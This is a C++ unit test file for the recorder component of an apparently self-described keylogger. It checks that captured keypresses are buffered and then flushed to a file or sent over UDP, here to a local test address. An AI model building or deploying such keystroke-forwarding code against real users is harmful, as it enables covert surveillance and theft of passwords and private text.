#include "recorder/recorder.h"

#include <fcntl.h>
#include <gtest/gtest.h>

#include <fstream>
#include <stdexcept>
#include <string>

#include "io/udp/udp_socket.h"

static const char* kFilePath = "test.txt";
static constexpr int kTestKeyLimit = 3;
static const char* kTestAddr = "127.0.0.1";
static const int kTestPort = 5555;

[[nodiscard]] static bool IsEmptyFile(const char* filepath) {
  std::ifstream handle(filepath);
  return (handle.peek() == std::ifstream::traits_type::eof());
}

[[nodiscard]] static bool StrEqualsFileContents(const std::string& s,
                                                const char* filepath) {
  std::string contents;
  std::ifstream handle(filepath);
  std::getline(handle, contents);

  return (s == contents);
}

static void ClearFile(const char* filepath) {
  std::ofstream handle(filepath, std::ofstream::out | std::ofstream::trunc);
  handle.close();
}

TEST(RecorderTest, FileRecorderConstructorSuccessfullyCreatesRecorder) {
  ASSERT_NO_THROW(auto recorder =
                      keylogger::FileRecorder(kTestKeyLimit, kFilePath));
}

TEST(RecorderTest,
     FileRecorderConstructorThrowsInvalidArgumentOnInvalidKeyLimit) {
  ASSERT_THROW(auto recorder = keylogger::FileRecorder(-1, kFilePath),
               std::invalid_argument);
  ASSERT_THROW(auto recorder = keylogger::FileRecorder(0, kFilePath),
               std::invalid_argument);
}

TEST(RecorderTest, FileRecorderBufferKeyBufferCharsUpToKeyLimit) {
  keylogger::FileRecorder recorder(kTestKeyLimit, kFilePath);

  /* Push enough chars to fill the buffer. At no point should the recorder write
   * the buffer out to file. */
  for (int i = 0; i < kTestKeyLimit; ++i) {
    ASSERT_NO_THROW(recorder.BufferKeyPress('@'));
  }

  /* Since we did not exceed the buffer limit nor did we call Transmit()
   * manually, the recorder file should be empty (i.e., the chars are still in
   * memory). */
  ASSERT_TRUE(IsEmptyFile(kFilePath));
}

TEST(RecorderTest, FileRecorderTransmitRecordsDataSuccessfully) {
  keylogger::FileRecorder recorder(kTestKeyLimit, kFilePath);

  /* Buffer the contents of a string. Note, that the string size does not exceed
   * the key_limit else the recorder object will flush prematurely. */
  const std::string kData("@@@");
  ASSERT_LE(kData.size(), kTestKeyLimit);
  for (const char& c : kData) {
    ASSERT_NO_THROW(recorder.BufferKeyPress(c));
  }
  ASSERT_NO_THROW(recorder.Transmit());
  ASSERT_TRUE(StrEqualsFileContents(kData, kFilePath));

  ClearFile(kFilePath);
}

TEST(RecorderTest, FileRecorderTransmitsWhenBufferIsFull) {
  keylogger::FileRecorder recorder(kTestKeyLimit, kFilePath);

  /* Push enough chars to fill the buffer. At no point should the recorder write
   * the buffer out to file. */
  for (int i = 0; i < kTestKeyLimit; ++i) {
    ASSERT_NO_THROW(recorder.BufferKeyPress('@'));
    ASSERT_TRUE(IsEmptyFile(kFilePath));
  }

  /* This next BufferKeyPress() call will exceed the keystroke limit of the
   * recorder and should trigger transmission (aka writing) of the buffer
   * contents to file. */
  ASSERT_NO_THROW(recorder.BufferKeyPress('@'));
  ASSERT_FALSE(IsEmptyFile(kFilePath));

  ClearFile(kFilePath);
}

TEST(RecorderTest, NetworkRecorderConstructorSuccessfullyCreatesRecorder) {
  ASSERT_NO_THROW(auto recorder = keylogger::NetworkRecorder(
                      kTestKeyLimit, kTestAddr, kTestPort));
}

TEST(RecorderTest, NetworkRecorderThrowsInvalidArgumentOnInvalidKeyLimit) {
  ASSERT_THROW(
      auto recorder = keylogger::NetworkRecorder(-1, kTestAddr, kTestPort),
      std::invalid_argument);
  ASSERT_THROW(
      auto recorder = keylogger::NetworkRecorder(0, kTestAddr, kTestPort),
      std::invalid_argument);
}

TEST(RecorderTest,
     NetworkRecorderConstructorThrowsInvalidArgumentOnInvalidKeyLimit) {
  ASSERT_THROW(
      auto recorder = keylogger::NetworkRecorder(-1, kTestAddr, kTestPort),
      std::invalid_argument);
  ASSERT_THROW(
      auto recorder = keylogger::NetworkRecorder(0, kTestAddr, kTestPort),
      std::invalid_argument);
}

TEST(RecorderTest,
     NetworkRecorderConstructorThrowsInvalidArgumentOnInvalidIpAddress) {
  ASSERT_THROW(auto recorder =
                   keylogger::NetworkRecorder(kTestKeyLimit, "foo", kTestPort),
               std::invalid_argument);
}

TEST(RecorderTest,
     NetworkRecorderConstructorThrowsInvalidArgumentOnInvalidPort) {
  ASSERT_THROW(
      auto recorder = keylogger::NetworkRecorder(kTestKeyLimit, kTestAddr, -1),
      std::invalid_argument);
  ASSERT_THROW(
      auto recorder = keylogger::NetworkRecorder(kTestKeyLimit, kTestAddr, 0),
      std::invalid_argument);
}

TEST(RecorderTest, NetworkRecorderTransmitRecordsDataSuccessfully) {
  keylogger::NetworkRecorder recorder(kTestKeyLimit, kTestAddr, kTestPort);
  keylogger::UdpSocket recver(kTestPort);

  /* Buffer the contents of a string. Note, that the string size does not
   * exceed the key_limit else the recorder object will flush prematurely.
   */
  const std::string kData("@@@");
  ASSERT_LE(kData.size(), kTestKeyLimit);
  for (const char& c : kData) {
    ASSERT_NO_THROW(recorder.BufferKeyPress(c));
  }

  /* Transmit the buffered chars over the socket. */
  ASSERT_NO_THROW(recorder.Transmit());

  /* Read the transmitted chars using a nonblocking UDP socket. */
  char recv_buffer[kTestKeyLimit + 1] = {'\0'};
  ASSERT_EQ(kData.size(), recver.Recv(recv_buffer, kData.size()));
  ASSERT_EQ(kData, std::string(recv_buffer));
}
